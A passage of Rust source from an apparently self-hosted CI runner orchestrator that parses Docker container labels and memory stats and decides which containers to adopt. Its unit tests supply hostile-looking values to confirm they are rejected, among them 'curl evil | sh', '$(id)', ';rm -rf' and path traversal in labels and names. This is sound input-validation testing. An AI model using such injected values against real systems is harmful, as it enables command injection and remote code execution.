    ];
    args.extend(live_status_filters());
    args.extend(["--format".to_string(), "{{json .ID}}".to_string()]);
    args
}

/// The ids in a [`faber_container_ps_args`] listing. `None` when any row cannot be
/// read (#105): a container of faber's left out would be charged to the
/// co-tenants.
fn faber_container_ids_from(text: &str) -> Option<BTreeSet<String>> {
    let rows = untrusted::json_lines_all::<String>(text, "co-tenant reserve: faber's containers")?;
    let ids = untrusted::accept_all(rows, "co-tenant reserve: faber's containers", |id| {
        if untrusted::object_id(&id) {
            Ok(Some(id))
        } else {
            Err("a container id is not 64 hex digits")
        }
    })?;
    Some(ids.into_iter().collect())
}

/// The full ids of every live container faber owns.
async fn faber_container_ids() -> anyhow::Result<BTreeSet<String>> {
    let text = docker_stdout(
        &faber_container_ps_args(),
        CLI_TIMEOUT,
        untrusted::OUTPUT_CAP,
    )
    .await?;
    faber_container_ids_from(&text)
        .ok_or_else(|| anyhow::anyhow!("a row of faber's container listing is unreadable"))
}

/// Every running container's id and memory use, one JSON object per line.
const STATS_FORMAT: &str = r#"{"ID":{{json .ID}},"Mem":{{json .MemUsage}}}"#;

/// One row of [`STATS_FORMAT`].
#[derive(Debug, Deserialize)]
struct StatsRow {
    #[serde(rename = "ID")]
    id: String,
    #[serde(rename = "Mem", default)]
    mem: String,
}

/// The memory readings in a [`STATS_FORMAT`] listing, by full container id. A row
/// that cannot be read is left out: only faber's containers are looked up here,
/// and [`faber_working_set`] refuses a sample that is missing one of them.
fn container_mem_from(text: &str) -> HashMap<String, u64> {
    let rows = untrusted::json_lines::<StatsRow>(text, "co-tenant reserve: docker stats");
    untrusted::accept(rows, "co-tenant reserve: docker stats", |row| {
        if !untrusted::object_id(&row.id) {
            return Err("a container id is not 64 hex digits");
        }
        Ok(parse_mem_usage_mib(&row.mem).map(|mib| (row.id, mib)))
    })
    .into_iter()
    .collect()
}

/// One `docker stats --no-stream` reading of every running container's memory.
async fn container_mem_mib() -> anyhow::Result<HashMap<String, u64>> {
    let text = docker_stdout(
        &[
            "stats",
            "--no-stream",
            "--no-trunc",
            "--format",
            STATS_FORMAT,
        ],
        CLI_TIMEOUT,
        untrusted::OUTPUT_CAP,
    )
    .await?;
    Ok(container_mem_from(&text))
}

/// Freeze every process in one container: `docker pause`, bounded. Refuses an id
/// that is not a full Docker id rather than hand it to the command line.
pub(crate) async fn pause_container(id: &str) -> anyhow::Result<()> {
    anyhow::ensure!(untrusted::object_id(id), "not a container id");
    docker_ok(&["pause", id], FREEZE_TIMEOUT).await
}

/// Thaw a frozen container: `docker unpause`, bounded. Refuses an id that is not
/// a full Docker id, like [`pause_container`].
pub(crate) async fn unpause_container(id: &str) -> anyhow::Result<()> {
    anyhow::ensure!(untrusted::object_id(id), "not a container id");
    docker_ok(&["unpause", id], FREEZE_TIMEOUT).await
}

/// Docker's RFC3339 `StartedAt` as Unix milliseconds.
///
/// Hand-rolled rather than pulling a date crate in for one field: the input is a
/// fixed-width UTC timestamp Docker emits, so only the first 19 characters are
/// ever read. A never-started container reads `0001-01-01T00:00:00Z`, which is
/// rejected by the year check rather than wrapping into a nonsense elapsed time.
fn epoch_ms_from_rfc3339(s: &str) -> Option<u64> {
    let b = s.as_bytes();
    if b.len() < 19 || b[4] != b'-' || b[7] != b'-' || b[10] != b'T' {
        return None;
    }
    let n = |a: usize, z: usize| s.get(a..z)?.parse::<i64>().ok();
    let (y, m, d) = (n(0, 4)?, n(5, 7)?, n(8, 10)?);
    let (hh, mm, ss) = (n(11, 13)?, n(14, 16)?, n(17, 19)?);
    if y < 1970 || !(1..=12).contains(&m) || !(1..=31).contains(&d) {
        return None;
    }
    // days_from_civil — the standard proleptic-Gregorian conversion, shifted so
    // the era starts in March and February's leap day lands at the end of a year.
    let y = y - i64::from(m <= 2);
    let era = if y >= 0 { y } else { y - 399 } / 400;
    let yoe = y - era * 400;
    let doy = (153 * (m + if m > 2 { -3 } else { 9 }) + 2) / 5 + d - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    let days = era * 146_097 + doe - 719_468;
    let secs = days * 86_400 + hh * 3_600 + mm * 60 + ss;
    u64::try_from(secs).ok()?.checked_mul(1000)
}

#[cfg(test)]
mod tests {
    #[test]
    fn a_full_disk_error_is_classified_as_disk_full() {
        assert!(super::stderr_says_disk_full(
            "docker: Error response from daemon: write /var/lib/docker/x: No Space Left On Device."
        ));
        assert!(!super::stderr_says_disk_full("Error: no such image"));
        assert!(!super::stderr_says_disk_full(""));
    }

    use std::sync::atomic::AtomicBool;
    use std::sync::Arc;

    // --- the usage sampler lets go of the claim at once --------------------

    /// A probe that reads `1`, `2`, … into the runner's peak, one per round, and
    /// from round `stall_from` on hangs after its reading, the way a `docker stats`
    /// against a slow daemon does. `rounds` counts the rounds begun.
    struct FakeProbe {
        stall_from: u64,
        rounds: watch::Sender<u64>,
    }

    impl super::UsageProbe for FakeProbe {
        async fn round(&self, usage: &mut super::Usage) {
            let n = *self.rounds.borrow() + 1;
            super::latch(&mut usage.runner_peak_mib, n);
            self.rounds.send_replace(n);
            if n >= self.stall_from {
                std::future::pending::<()>().await;
            }
        }
    }

    /// Run [`super::sample_until`] until `rounds_before_done` rounds have begun,
    /// signal done, and return what it read — failing if it took more than a
    /// fraction of a second to notice.
    async fn sample_then_signal(
        stall_from: u64,
        every: Duration,
        rounds_before_done: u64,
    ) -> super::Usage {
        let (rounds, mut seen) = watch::channel(0);
        let (done, done_rx) = watch::channel(false);
        let sampler = tokio::spawn(async move {
            let probe = FakeProbe { stall_from, rounds };
            super::sample_until(&probe, done_rx, every).await
        });
        seen.wait_for(|n| *n >= rounds_before_done).await.unwrap();
        let signalled = std::time::Instant::now();
        done.send_replace(true);
        let usage = tokio::time::timeout(Duration::from_secs(1), sampler)
            .await
            .expect("the sampler must return promptly once done is signalled")
            .unwrap();
        assert!(signalled.elapsed() < Duration::from_millis(500));
        usage
    }

    /// Done arriving during the pause between rounds ends the pause; it does not
    /// wait out [`super::STATS_POLL`].
    #[tokio::test]
    async fn sampler_returns_promptly_when_done_lands_between_rounds() {
        let usage = sample_then_signal(u64::MAX, Duration::from_secs(3600), 1).await;
        assert_eq!(usage.runner_peak_mib, Some(1), "the round it took is kept");
    }

    /// Done arriving while a round's reads are in flight abandons them, and keeps
    /// what that round had already read as well as every round before it.
    #[tokio::test]
    async fn sampler_abandons_an_in_flight_round_and_keeps_its_readings() {
        let usage = sample_then_signal(3, Duration::ZERO, 3).await;
        assert_eq!(usage.runner_peak_mib, Some(3));
    }

    /// Done already set before the first round: no reads at all.
    #[tokio::test]
    async fn sampler_takes_no_reading_once_done() {
        let (rounds, seen) = watch::channel(0);
        let (_done, done_rx) = watch::channel(true);
        let probe = FakeProbe {
            stall_from: u64::MAX,
            rounds,
        };
        let usage = super::sample_until(&probe, done_rx, Duration::ZERO).await;
        assert_eq!(usage.runner_peak_mib, None);
        assert_eq!(*seen.borrow(), 0);
    }

    // --- #63: a profile image's presence -----------------------------------

    #[test]
    fn only_the_daemons_own_no_such_image_reads_as_absent() {
        use super::{presence_of, ImagePresence};
        let id = format!("sha256:{}", "a".repeat(64));
        assert_eq!(
            presence_of(true, &format!("{id}\n"), ""),
            ImagePresence::Present
        );
        // Both phrasings Docker has used for the same refusal.
        assert_eq!(
            presence_of(false, "", "Error response from daemon: No such image: x:1"),
            ImagePresence::Absent
        );
        assert_eq!(
            presence_of(false, "", "Error: No such image: x:1"),
            ImagePresence::Absent
        );
        // A daemon that is not answering must not stop a runner.
        assert!(matches!(
            presence_of(false, "", "Cannot connect to the Docker daemon"),
            ImagePresence::Unknown(_)
        ));
        // Nor may a success that prints something other than an id (#105).
        assert!(matches!(
            presence_of(true, "No such image\n", ""),
            ImagePresence::Unknown(_)
        ));
    }

    // --- ADR-0011: the container is the claim ------------------------------

    /// What `ADOPT_FORMAT` prints for one container, as a mutable JSON value.
    fn good_container() -> serde_json::Value {
        serde_json::json!({
            "Name": "/faber-runner-1001-1756000000000",
            "Running": true,
            "StartedAt": "2026-08-28T10:00:00.123456789Z",
            "Memory": 9663676416i64, // 9216 MiB
            "NanoCpus": 4000000000i64, // 4 cores
            "Image": "ghcr.io/owner/runner:2.335.1",
            "Labels": {
                "org.faber.owned": "true",
                "org.faber.kind": "runner",
                "org.faber.repo": "owner/demo",
                "org.faber.id": "1001-1756000000000",
                "org.faber.run-id": "5000",
                "org.faber.provision-attempt": "2",
                "org.faber.profile": "faber-docker",
                "org.faber.class": "owner/demo::12345::Playwright E2E",
                "org.faber.reserved-mib": "6600",
                "org.faber.serves": "1.61.1,1.62.1",
                "org.faber.reserved-mcpu": "2500"
            }
        })
    }

    fn line(c: &serde_json::Value) -> String {
        c.to_string()
    }

    fn with_label(mut c: serde_json::Value, key: &str, value: &str) -> serde_json::Value {
        c["Labels"][key] = serde_json::Value::String(value.to_string());
        c
    }

    fn without_label(mut c: serde_json::Value, key: &str) -> serde_json::Value {
        c["Labels"].as_object_mut().unwrap().remove(key);
        c
    }

    #[test]
    fn a_fully_labelled_runner_container_rebuilds_its_claim() {
        let a = parse_adopted(&line(&good_container())).expect("adoptable");
        assert_eq!(a.job_id, 1001);
        assert_eq!(a.repo, "owner/demo");
        assert_eq!(a.run_id, 5000);
        assert_eq!(a.attempt, 2);
        assert_eq!(a.profile, "faber-docker");
        assert_eq!(a.class, "owner/demo::12345::Playwright E2E");
        // The whole reason the label exists: what the limiter *charged*, which is
        // not the ceiling the container was started with.
        assert_eq!(a.reserved_mib, 6600);
        assert_eq!(a.limits.runner.memory_mib, 9216);
        assert_ne!(a.reserved_mib, a.limits.runner.memory_mib);
        // The same split for CPU (ADR-0019): the charge is the claim's own share,
        // the quota is whatever the cohort sized the container at.
        assert_eq!(a.reserved_mcpu, Some(2500));
        assert_eq!(a.limits.runner.cpus, 4.0);
        assert_eq!(a.image, "ghcr.io/owner/runner:2.335.1");
        assert_eq!(a.serves, vec!["1.61.1", "1.62.1"]);
        assert!(a.running);
        assert_eq!(a.runner(), "faber-runner-1001-1756000000000");
    }

    #[test]
    fn a_container_from_before_adr0019_is_still_adoptable() {
        // No CPU charge label and no quota: exactly what every container minted
        // before ADR-0019 looks like. Refusing to adopt it would force the drain
        // ADR-0011 exists to avoid, over a number that is only ever an estimate —
        // so it is adopted, and the caller charges its class's current share.
        let mut c = without_label(good_container(), "org.faber.reserved-mcpu");
        c["NanoCpus"] = serde_json::json!(0);
        let a = parse_adopted(&line(&c)).expect("adoptable without the CPU label");
        assert_eq!(a.reserved_mcpu, None);
        assert_eq!(a.limits.runner.cpus, 0.0, "no quota reads as none");
        assert_eq!(a.reserved_mib, 6600, "the memory charge is still exact");
    }

    #[test]
    fn a_container_from_a_pre_adr0011_faber_is_not_adoptable() {
        // An absent label is absent from the map. Adopting on a guessed
        // reservation would charge the ledger a number nobody measured, which is
        // worse than the one drain that not adopting costs.
        for (short, key) in ADOPT_LABELS {
            let c = without_label(good_container(), key);
            assert!(
                parse_adopted(&line(&c)).is_none(),
                "{short} missing must make the container un-adoptable"
            );
        }
        let mut c = good_container();
        c["Labels"] = serde_json::Value::Null;
        assert!(parse_adopted(&line(&c)).is_none(), "no labels at all");
    }

    #[test]
    fn an_unknown_image_serves_nothing_and_is_still_adoptable() {
        // Empty `serves` is a real value — the ADR-0009 "unknown" image — and must
        // stay distinguishable from the absent label above.
        let c = with_label(good_container(), "org.faber.serves", "");
        let a = parse_adopted(&line(&c)).expect("adoptable with an unknown image");
        assert!(a.serves.is_empty());

        let c = without_label(good_container(), "org.faber.serves");
        assert!(parse_adopted(&line(&c)).is_none());
    }

    #[test]
    fn an_exited_container_is_adopted_too() {
        // Its corpse still carries the exit code and the OOM verdict — strictly
        // more than the sweep would have recovered from it.
        let mut c = good_container();
        c["Running"] = serde_json::json!(false);
        let a = parse_adopted(&line(&c)).expect("adoptable");
        assert!(!a.running);
    }

    // --- ADR-0051: runners left in a switched-off Linux VM --------------------

    /// One [`retire_with`] pass over a runner whose process table and GitHub
    /// answer as given: whether it is gone, and whether it was torn down.
    async fn retire_pass(
        cap_passed: bool,
        activity: &[RunnerActivity],
        withdrawal: Withdrawal,
    ) -> (bool, bool) {
        let looks = std::sync::Mutex::new(activity.iter().cloned());
        let torn = std::sync::atomic::AtomicBool::new(false);
        let gone = retire_with(
            cap_passed,
            || {
                reclaim_clearance(
                    || std::future::ready(looks.lock().unwrap().next().expect("a look")),
                    || std::future::ready(withdrawal),
                )
            },
            || async { torn.store(true, Ordering::SeqCst) },
        )
        .await;
        (gone, torn.load(Ordering::SeqCst))
    }

    #[tokio::test]
    async fn a_switched_off_vms_idle_runner_is_withdrawn_and_removed() {
        // Idle, withdrawn, still idle: the reclaim's own clearance, so it takes no
        // new job on a host whose docker profiles are off.
        let (gone, torn) = retire_pass(
            false,
            &[RunnerActivity::Idle, RunnerActivity::Idle],
            Withdrawal::Withdrawn,
        )
        .await;
        assert!(gone && torn);
        // One faber's records do not vouch for is never withdrawn (#105): it
        // waits for its job or its cap.
        let (gone, torn) = retire_pass(
            false,
            &[RunnerActivity::Idle],
            Withdrawal::Failed("no mint record".into()),
        )
        .await;
        assert!(!gone && !torn);
    }

    #[tokio::test]
    async fn a_switched_off_vms_busy_runner_is_left_to_finish() {
        // Busy: refused, and GitHub is not even asked.
        let (gone, torn) = retire_pass(
            false,
            &[RunnerActivity::Executing],
            Withdrawal::Failed("must not be asked".into()),
        )
        .await;
        assert!(!gone && !torn);
        // Its job done, the ephemeral runner exited: torn down on the next pass.
        let (gone, torn) = retire_pass(
            false,
            &[RunnerActivity::Stopped],
            Withdrawal::Failed("must not be asked".into()),
        )
        .await;
        assert!(gone && torn);
    }

    #[tokio::test]
    async fn a_switched_off_vms_runner_is_removed_at_its_cap_job_or_no_job() {
        // Past the cap, as a watched runner's cap expiry: removed, busy or not,
        // without a look.
        let (gone, torn) = retire_pass(true, &[], Withdrawal::JobAssigned).await;
        assert!(gone && torn);
        // The cap is measured from the container's own start, and 0 is no cap.
        let three_h = DEFAULT_RUNNER_TIMEOUT;
        assert_eq!(
            cap_deadline_ms(1_000, three_h),
            Some(1_000 + 3 * 60 * 60 * 1000)
        );
        assert_eq!(cap_deadline_ms(1_000, Duration::ZERO), None);
        // An opaque runner's start reads too, so the cap reaches it.
        let o = parse_opaque(&line(&unlabelled_container())).expect("charged");
        assert!(o.started_ms.is_some());
    }

    #[test]
    fn a_foreign_container_is_never_claimed() {
        let mut c = good_container();
        c["Name"] = serde_json::json!("/myproj-faber-runner-1-2");
        assert!(parse_adopted(&line(&c)).is_none());
        c["Name"] = serde_json::json!("/faber-dind-1-2");
        assert!(parse_adopted(&line(&c)).is_none());
    }

    /// #105: the daemon reporting these labels may be lying, and they become a
    /// claim — a repo faber queries, a name it hands back to `docker`, numbers it
    /// charges. A container whose labels do not read as faber wrote them is not
    /// adopted, whatever else about it looks right.
    #[test]
    fn a_container_whose_labels_are_not_fabers_own_is_not_adopted() {
        let oversized_class = format!("owner/demo::1::{}", "x".repeat(2000));
        let cases: [(&str, &str); 11] = [
            // A repo that would steer the API path a reconcile builds from it.
            ("org.faber.repo", "x/../../orgs/victim"),
            ("org.faber.repo", "owner/demo?name=x"),
            ("org.faber.repo", "owner/demo; curl evil | sh"),
            // A class of another repo, or with a control character in it.
            ("org.faber.class", "other/repo::1::build"),
            ("org.faber.class", "owner/demo::1::a\nb"),
            ("org.faber.class", oversized_class.as_str()),
            // Numbers that are not numbers, or not the width faber writes.
            ("org.faber.run-id", "-1"),
            ("org.faber.provision-attempt", "99999999999"),
            ("org.faber.reserved-mib", "1e9"),
            // A served version a shell would act on.
            ("org.faber.serves", "1.61.1,$(id)"),
            ("org.faber.profile", ""),
        ];
        for (key, value) in cases {
            let c = with_label(good_container(), key, value);
            assert!(
                parse_adopted(&line(&c)).is_none(),
                "{key}={value:?} must not be adopted"
            );
        }
    }

    /// #94: a runner named for its instance is adopted under exactly the name it
    /// registered with, and one from before instance ids still is too.
    #[test]
    fn a_container_named_for_its_instance_is_adopted_under_that_name() {
        let mut c = with_label(
            good_container(),
            "org.faber.id",
            "1001-1756000000000-builder",
        );
        c["Name"] = serde_json::json!("/faber-runner-1001-1756000000000-builder");
        let a = parse_adopted(&line(&c)).expect("adoptable");
        assert_eq!(a.job_id, 1001);
        assert_eq!(a.runner(), "faber-runner-1001-1756000000000-builder");
        assert_eq!(a.registration(), "faber-1001-1756000000000-builder");

        let old = parse_adopted(&line(&good_container())).expect("adoptable");
        assert_eq!(old.registration(), "faber-1001-1756000000000");
    }

    #[test]
    fn a_name_that_is_not_a_claim_id_is_not_adopted() {
        for name in [
            "/faber-runner-1001",
            "/faber-runner-x-1756000000000",
            "/faber-runner-1-2;rm -rf",
            "/faber-runner-1-2 3",
            "/faber-runner-1-2-Builder",
            "/faber-runner-1-2-3",
        ] {
            let mut c = good_container();
            c["Name"] = serde_json::json!(name);
            assert!(parse_adopted(&line(&c)).is_none(), "{name:?}");
        }
    }

    /// #105: a charge no VM could hold is held to the most there is, never refused.
    /// Adopted on a smaller figure, or not adopted and charged its ceiling, the
    /// ledger would hold less than the claim's own label asks it to.
    #[test]
    fn a_charge_past_any_vm_is_held_to_the_most_there_is() {
        let huge = u64::MAX.to_string();
        let c = with_label(good_container(), "org.faber.reserved-mib", &huge);
        let c = with_label(c, "org.faber.reserved-mcpu", &huge);
        let a = parse_adopted(&line(&c)).expect("digits, so still faber's form");
        assert_eq!(a.reserved_mib, untrusted::MAX_MEM_MIB);
        assert_eq!(
            a.reserved_mcpu,
            Some(untrusted::MAX_CPUS * 1000),
            "held, never dropped to the class estimate"
        );
    }

    #[test]
    fn a_ceiling_no_container_could_have_is_never_taken_as_read() {
        let mut c = good_container();
        c["Memory"] = serde_json::json!(-1);
        assert!(parse_adopted(&line(&c)).is_none(), "a negative ceiling");
        // An absurd one is held to the most there is: censoring's cap here, and
        // what an opaque runner is charged.
        c["Memory"] = serde_json::json!(i64::MAX);
        assert_eq!(
            parse_adopted(&line(&c)).unwrap().limits.runner.memory_mib,
            untrusted::MAX_MEM_MIB
        );
        // The quota is a ceiling read back for censoring, so an absurd one reads as
        // the absent one.
        let mut c = good_container();
        c["NanoCpus"] = serde_json::json!(i64::MAX);
        assert_eq!(parse_adopted(&line(&c)).unwrap().limits.runner.cpus, 0.0);
        let mut c = good_container();
        c["Image"] = serde_json::json!("img; id");
        assert!(
            parse_adopted(&line(&c)).is_none(),
            "an image that is no reference"
        );
    }

    /// The reason the inspect is JSON now: tab-separated, a label value carrying a
    /// newline could print a whole second container of its own. As JSON it is one
    /// escaped string inside one line, so one container stays one container, and
    /// the value is refused besides.
    #[test]
    fn a_newline_in_a_label_cannot_forge_a_second_container() {
        let forged = format!(
            "owner/demo\n{}",
            line(&with_label(
                good_container(),
                "org.faber.repo",
                "victim/repo"
            ))
        );
        let c = with_label(good_container(), "org.faber.repo", &forged);
        let rows = untrusted::json_lines::<Inspected>(&line(&c), "test");
        assert_eq!(rows.len(), 1, "one line, one container");
        assert!(adopted_from(&rows[0]).is_none());
    }

    #[test]
    fn started_at_parses_to_unix_millis() {
        assert_eq!(epoch_ms_from_rfc3339("1970-01-01T00:00:00Z"), Some(0));
        assert_eq!(
            epoch_ms_from_rfc3339("2026-08-28T10:00:00.5Z"),
            Some(1787911200000)
        );
        // A leap day, to prove the civil-days conversion is not approximated.
        assert_eq!(
            epoch_ms_from_rfc3339("2024-02-29T00:00:00Z"),
            Some(1709164800000)
        );
        // Docker's "never started" sentinel must not wrap into a nonsense elapsed.
        assert_eq!(epoch_ms_from_rfc3339("0001-01-01T00:00:00Z"), None);
        assert_eq!(epoch_ms_from_rfc3339("garbage"), None);
    }

    #[test]
    fn a_runner_container_carries_provenance_and_the_claim_together() {
        let claim = ClaimMarks {
            run_id: 7,
            attempt: 1,
            profile: "faber-docker".into(),
            class: "owner/demo::9::build".into(),
            reserved_mib: 1024,
            reserved_mcpu: 2500,
            serves: "1.61.1".into(),
            services: String::new(),
            hook: crate::job_start::HookPlan {
                outcome: crate::job_start::DeadlineOutcome::Allow,
                deadline: Duration::from_secs(180),
            },
        };
        let m = runner_marks("owner/demo", "42-1700", &claim);
        let kv: Vec<&String> = m.iter().filter(|a| *a != "--label").collect();
        for expected in [
            "org.faber.owned=true",
            "org.faber.kind=runner",
            "org.faber.repo=owner/demo",
            "org.faber.id=42-1700",
            "org.faber.run-id=7",
            "org.faber.provision-attempt=1",
            "org.faber.profile=faber-docker",
            "org.faber.class=owner/demo::9::build",
            "org.faber.reserved-mib=1024",
            "org.faber.reserved-mcpu=2500",
            "org.faber.serves=1.61.1",
            // ADR-0059 §2: the hook's deadline outcome, for adoption.
            "org.faber.hook=allow",
        ] {
            assert!(kv.iter().any(|v| **v == expected), "missing {expected}");
        }
        // Every mark is a `--label` flag and nothing else got in.
        assert_eq!(m.len(), kv.len() * 2);
        // A runner with no services carries no services mark at all.
        assert!(!kv.iter().any(|v| v.starts_with("org.faber.services")));
    }

    /// ADR-0046 §10: the services mark is stamped only when the runner has
    /// services, and it is not one of the labels adoption requires, so a
    /// container from before it stays adoptable.
    #[test]
    fn the_services_mark_is_optional_and_not_required_for_adoption() {
        let claim = ClaimMarks {
            services: "postgres-16,redis".into(),
            ..ClaimMarks::default()
        };
        let m = runner_marks("owner/demo", "42-1700", &claim);
        assert!(m
            .iter()
            .any(|v| v == "org.faber.services=postgres-16,redis"));
        assert!(!ADOPT_LABELS.iter().any(|(_, k)| *k == LABEL_SERVICES));
        // Absent: adopted all the same, with no services.
        let a = parse_adopted(&good_container().to_string()).expect("adoptable");
        assert!(a.services.is_empty());
    }

    #[test]
    fn an_adopted_runner_reads_its_services_back() {
        let mut c = good_container();
        c["Labels"]["org.faber.services"] = serde_json::json!("postgres-16,redis");
        let a = parse_adopted(&c.to_string()).expect("adoptable");
        assert_eq!(a.services, ["postgres-16", "redis"]);
        assert_eq!(
            a.claim_id(),
            a.registration().strip_prefix("faber-").unwrap()
        );
    }

    /// #105: the label is daemon-reported. One that is not in faber's form reads
    /// as no services rather than refusing the claim: the label is optional, and
    /// what it named goes to `sweep`.
    #[test]
    fn a_services_label_not_in_fabers_form_reads_as_none() {
        for bad in [
            "postgres-16,../x",
            "mysql-8",
            "redis-7",
            "redis;true",
            "postgres-",
            "postgres-16 ",
        ] {
            assert!(services_from_label(Some(bad)).is_empty(), "{bad}");
        }
        assert!(services_from_label(None).is_empty());
        assert!(services_from_label(Some("")).is_empty());
        assert_eq!(services_from_label(Some("mailpit")), ["mailpit"]);
        // Any name in faber's form is adopted, whether or not the config still
        // declares it (A4); a form faber never writes is not.
        assert_eq!(
            services_from_label(Some("postgres-16,s3,gateway2")),
            ["postgres-16", "s3", "gateway2"]
        );
        for bad in [
            "S3",
            "s3-1",
            "s_3",
            "3s",
            "postgres",
            "s3,",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        ] {
            assert!(services_from_label(Some(bad)).is_empty(), "{bad}");
        }
        let mut c = good_container();
        c["Labels"]["org.faber.services"] = serde_json::json!("redis\nforged");
        let a = parse_adopted(&c.to_string()).expect("still adoptable");
        assert!(a.services.is_empty());
    }

    /// ADR-0046 §10: no secret goes on an argv. The services' variables appear on
    /// the runner's `docker run` as bare names, before the profile's own `env` so
    /// a profile value wins, and their values reach only the CLI child's
    /// environment, after which the JIT config still has the last word.
    #[test]
    fn service_env_is_name_only_on_argv_and_profile_env_wins() {
        let secret = "postgres://faber_r_1_2:S3CRET@postgres:5432/faber_r_1_2";
        let services = vec![("DATABASE_URL", secret), ("PGPASSWORD", "S3CRET")];
        let names: Vec<&str> = services.iter().map(|(k, _)| *k).collect();
        let mut c = cfg();
        c.env
            .insert("DATABASE_URL".into(), "postgres://mine@db/mine".into());
        let a = runner_run_args(
            "faber-runner-1",
            "faber-net-1",
            Mounts {
                service_env: &names,
                ..Default::default()
            },
            &c,
            &ResourceLimits::default(),
            &[],
        );
        assert!(!a.iter().any(|s| s.contains("S3CRET")), "{a:?}");
        assert!(a.windows(2).any(|w| w == ["-e", "PGPASSWORD"]));
        let bare = a
            .windows(2)
            .position(|w| w == ["-e", "DATABASE_URL"])
            .expect("DATABASE_URL forwarded by name");
        let profile = a
            .iter()
            .position(|s| s == "DATABASE_URL=postgres://mine@db/mine")
            .expect("the profile's value");
        assert!(bare < profile, "the profile's -e must come last: {a:?}");

        let env = launch_env("JITBLOB", services.clone());
        assert_eq!(
            env,
            [
                ("DATABASE_URL", secret),
                ("PGPASSWORD", "S3CRET"),
                (RUNNER_JITCONFIG_ENV, "JITBLOB")
            ]
        );
        // A service can never shadow the JIT config.
        let env = launch_env("JITBLOB", vec![(RUNNER_JITCONFIG_ENV, "forged")]);
        assert_eq!(env, [(RUNNER_JITCONFIG_ENV, "JITBLOB")]);
        // With no services the launch is exactly what it was.
        assert_eq!(
            launch_env("JITBLOB", crate::services::Attached::none().env()),
            [(RUNNER_JITCONFIG_ENV, "JITBLOB")]
        );
        let plain = runner_run_args(
            "faber-runner-1",
            "faber-net-1",
            Mounts::default(),
            &cfg(),
            &ResourceLimits::default(),
            &[],
        );
        assert!(!plain.iter().any(|s| s == "DATABASE_URL"));
    }

    /// A runner container whose claim labels are all gone, as one minted before
    /// ADR-0011 looks.
    fn unlabelled_container() -> serde_json::Value {
        let mut c = good_container();
        c["Labels"] = serde_json::json!({
            "org.faber.owned": "true",
            "org.faber.kind": "runner",
        });
        c
    }

    #[test]
    fn an_unlabelled_running_container_is_charged_even_though_it_cannot_be_adopted() {
        // The invariant that actually keeps the host off its OOM killer: every
        // faber-owned *running* container is on the ledger, whether or not faber
        // can say whose claim it is. This is the migration window's safety, and
        // it is not migration-specific.
        let c = unlabelled_container();
        assert!(parse_adopted(&line(&c)).is_none());
        let o = parse_opaque(&line(&c)).expect("ours, running, unaccounted");
        assert_eq!(o.name, "faber-runner-1001-1756000000000");
        assert_eq!(o.dind.as_deref(), Some("faber-dind-1001-1756000000000"));
        assert_eq!(
            o.mem_mib, 9216,
            "charged the applied ceiling it can answer with"
        );
        assert!(o.reason.contains("reserved-mib"));
    }

    #[test]
    fn a_running_container_whose_labels_do_not_read_is_still_charged() {
        // #105 refuses to adopt it, which must never mean "costs nothing": the
        // memory is held whatever its labels say.
        let c = with_label(good_container(), "org.faber.repo", "x/../../orgs/victim");
        assert!(parse_adopted(&line(&c)).is_none());
        let o = parse_opaque(&line(&c)).expect("still ours and still running");
        assert_eq!(o.mem_mib, 9216);
        assert_eq!(o.reason, "labels present but unreadable");
    }

    #[test]
    fn an_exited_unlabelled_container_costs_nothing_and_is_the_janitors() {
        let mut c = unlabelled_container();
        c["Running"] = serde_json::json!(false);
        assert!(
            parse_opaque(&line(&c)).is_none(),
            "an exited container holds no memory, so there is nothing to charge"
        );
    }

    #[test]
    fn a_foreign_running_container_is_never_charged() {
        let mut c = unlabelled_container();
        c["Name"] = serde_json::json!("/myproj-faber-runner-1-2");
        assert!(parse_opaque(&line(&c)).is_none());
    }

    /// #105: a refusal to read a runner never means it costs nothing. One whose
    /// name gives no id a dind could be named by is charged alone, with no dind
    /// inspected on its behalf, and a ceiling that does not read charges the most
    /// there is.
    #[test]
    fn a_running_container_faber_cannot_read_is_charged_the_most() {
        let mut c = unlabelled_container();
        c["Name"] = serde_json::json!("/faber-runner-1-2;id");
        let o = parse_opaque(&line(&c)).expect("ours, running");
        assert_eq!(o.dind, None, "no dind name is built from it");
        assert_eq!(o.mem_mib, 9216);
        c["Memory"] = serde_json::json!(-1);
        assert_eq!(
            parse_opaque(&line(&c)).unwrap().mem_mib,
            untrusted::MAX_MEM_MIB
        );
    }

    /// #105: an inspect answer feeds a ledger that must charge every running
    /// container, so it is read whole or not at all. One line that does not parse,
    /// or one container nobody asked about, and the scan cannot tell, which keeps
    /// admission shut rather than charging one container fewer.
    #[test]
    fn an_inspect_answer_is_read_whole_or_not_at_all() {
        let asked = ["faber-runner-1001-1756000000000".to_string()];
        let good = line(&good_container());
        assert_eq!(inspected_answer(&good, &asked).map(|f| f.len()), Some(1));
        assert_eq!(
            inspected_answer("", &asked).map(|f| f.len()),
            Some(0),
            "a container gone since the listing is simply gone"
        );
        assert!(inspected_answer(&format!("{good}\nnot json"), &asked).is_none());
        let mut other = good_container();
        other["Name"] = serde_json::json!("/faber-runner-1-2");
        assert!(
            inspected_answer(&format!("{good}\n{}", line(&other)), &asked).is_none(),
            "an answer for a container that was not asked about"
        );
    }

    // --- ADR-0032 §2: a frozen job is still alive ----------------------------

    fn has_arg(args: &[String], want: &str) -> bool {
        args.iter().any(|a| a == want)
    }

    #[test]
    fn a_live_listing_asks_for_running_and_frozen_containers() {
        // Docker reports a paused container `Running`, with the status `paused`,
        // which `status=running` alone leaves out: a frozen job would read as gone.
        assert_eq!(
            live_status_filters(),
            ["--filter", "status=running", "--filter", "status=paused"]
        );
        for args in [job_container_ps_args(), unlabelled_runner_ps_args()] {
            assert!(has_arg(&args, "status=running"), "{args:?}");
            assert!(has_arg(&args, "status=paused"), "{args:?}");
            assert!(!has_arg(&args, "-a"), "never the exited ones: {args:?}");
        }
    }

    #[test]
    fn the_critical_floor_finds_job_containers_by_label_never_by_name() {
        let args = job_container_ps_args();
        assert!(has_arg(&args, "label=org.faber.owned=true"), "{args:?}");
        assert!(
            !args.iter().any(|a| a.starts_with("name=")),
            "names are a convention, labels a fact (AGENTS.md): {args:?}"
        );
        assert!(
            has_arg(&args, "--no-trunc"),
            "a whole id, or none: {args:?}"
        );
        assert_eq!(args.last().map(String::as_str), Some(JOB_CONTAINER_FORMAT));
        for key in [LABEL_KIND, LABEL_ID] {
            assert!(JOB_CONTAINER_FORMAT.contains(&format!("(.Label \"{key}\")")));
        }
    }

